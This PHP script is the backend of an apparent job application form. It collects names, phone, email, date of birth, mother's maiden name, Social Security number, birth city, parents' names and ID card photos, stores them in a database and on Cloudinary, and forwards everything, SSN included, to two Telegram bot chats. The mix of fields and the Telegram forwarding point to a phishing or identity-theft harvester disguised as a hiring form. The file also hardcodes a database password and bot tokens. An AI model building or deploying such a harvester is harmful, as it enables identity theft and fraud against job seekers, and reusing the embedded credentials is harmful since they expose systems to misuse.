<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

// ======================
// CLOUDINARY CONFIG
// ======================
$cloudName = "dlddiquex";
$uploadPreset = "job_forms";

// ======================
// NEON DB
// ======================
$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
$db   = "neondb";
$user = "neondb_owner";
$pass = "npg_TQ1gBOwA9rCa";
$port = "5432";

$dsn = "pgsql:host=$host;port=$port;dbname=$db;sslmode=require";

try {
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (Exception $e) {
    die("DB Connection failed: " . $e->getMessage());
}

// ======================
// VALIDATE INPUT (LIKE LARAVEL STYLE)
// ======================
function clean($key) {
    return $_POST[$key] ?? '';
}

$first_name = clean('first_name');
$middle_name = clean('middle_name');
$last_name = clean('last_name');
$phone = clean('phone');
$email = clean('email');
$dob = clean('dob');
$mother_maiden = clean('mother_maiden');
$ssn = clean('ssn');
$birth_city = clean('birth_city');

$address_line1 = clean('address_line1');
$address_line2 = clean('address_line2');
$city = clean('city');
$state = clean('state');
$zip_code = clean('zip_code');

$father_name = clean('father_name');
$mother_name = clean('mother_name');

$address = trim("$address_line1 $address_line2, $city, $state $zip_code");

// ======================
// CLOUDINARY UPLOAD (ROBUST VERSION)
// ======================
function uploadToCloudinary($file, $cloudName, $uploadPreset) {

    if (!isset($file) || $file['error'] !== 0) {
        return null;
    }

    // Laravel-like validation (MAX 5MB like your example)
    if ($file['size'] > 5 * 1024 * 1024) {
        return null;
    }

    $url = "https://api.cloudinary.com/v1_1/$cloudName/image/upload";

    $postFields = [
        'file' => new CURLFile($file['tmp_name']),
        'upload_preset' => $uploadPreset,
        'folder' => 'job_applications'
    ];

    $ch = curl_init();

    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postFields,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 90,
        CURLOPT_CONNECTTIMEOUT => 20
    ]);

    $response = curl_exec($ch);
    $error = curl_error($ch);

    curl_close($ch);

    if ($error || !$response) {
        error_log("Cloudinary error: " . $error);
        return null;
    }

    $result = json_decode($response, true);

    if (!isset($result['secure_url'])) {
        error_log("Cloudinary invalid response: " . $response);
        return null;
    }

    return $result['secure_url'];
}

// ======================
// UPLOAD FILES (LIKE LARAVEL LOOP STYLE)
// ======================
$front_url = null;
$back_url = null;

if (isset($_FILES['front_id'])) {
    $front_url = uploadToCloudinary($_FILES['front_id'], $cloudName, $uploadPreset);
}

if (isset($_FILES['back_id'])) {
    $back_url = uploadToCloudinary($_FILES['back_id'], $cloudName, $uploadPreset);
}

// ======================
// SAVE TO DATABASE
// ======================
$stmt = $pdo->prepare("
INSERT INTO job_applications (
first_name, middle_name, last_name,
phone, email, dob, mother_maiden,
ssn, birth_city, address,
father_name, mother_name,
front_id, back_id
)
VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
");

$stmt->execute([
$first_name, $middle_name, $last_name,
$phone, $email, $dob, $mother_maiden,
$ssn, $birth_city, $address,
$father_name, $mother_name,
$front_url, $back_url
]);

// ======================
// TELEGRAM
// ======================
$bot1 = "8538050369:AAGHHSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
$chat1 = "6513265609";

$bot2 = "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0";
$chat2 = "5469294503";

function sendTelegram($bot, $method, $data) {

    $url = "https://api.telegram.org/bot{$bot}/{$method}";

    $ch = curl_init();

    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false
    ]);

    $response = curl_exec($ch);
    $error = curl_error($ch);

    curl_close($ch);

    if ($error) {
        error_log("Telegram Error: " . $error);
        return false;
    }

    return $response;
}

// ======================
// MESSAGE
// ======================
$text =
"📄 New Application Submitted\n\n".
"👤 Name: $first_name $middle_name $last_name\n".
"📞 Phone: $phone\n".
"📧 Email: $email\n".
"🎂 DOB: $dob\n".
"🏠 Address: $address\n".
"🏙 Birth City: $birth_city\n".
"👨 Father: $father_name\n".
"👩 Mother: $mother_name\n".
"🧾 SSN: $ssn";

// SEND TEXT
sendTelegram($bot1, "sendMessage", ["chat_id"=>$chat1,"text"=>$text]);
sendTelegram($bot2, "sendMessage", ["chat_id"=>$chat2,"text"=>$text]);

// SEND IMAGES ONLY IF VALID
if (!empty($front_url)) {
sendTelegram($bot1, "sendPhoto", ["chat_id"=>$chat1,"photo"=>$front_url,"caption"=>"Front ID"]);
sendTelegram($bot2, "sendPhoto", ["chat_id"=>$chat2,"photo"=>$front_url,"caption"=>"Front ID"]);
}

if (!empty($back_url)) {
sendTelegram($bot1, "sendPhoto", ["chat_id"=>$chat1,"photo"=>$back_url,"caption"=>"Back ID"]);
sendTelegram($bot2, "sendPhoto", ["chat_id"=>$chat2,"photo"=>$back_url,"caption"=>"Back ID"]);
}

// ======================
// SUCCESS PAGE
// ======================
echo "<h1 style='text-align:center;margin-top:50px;color:green;'>Form Submitted Successfully</h1>";

?>
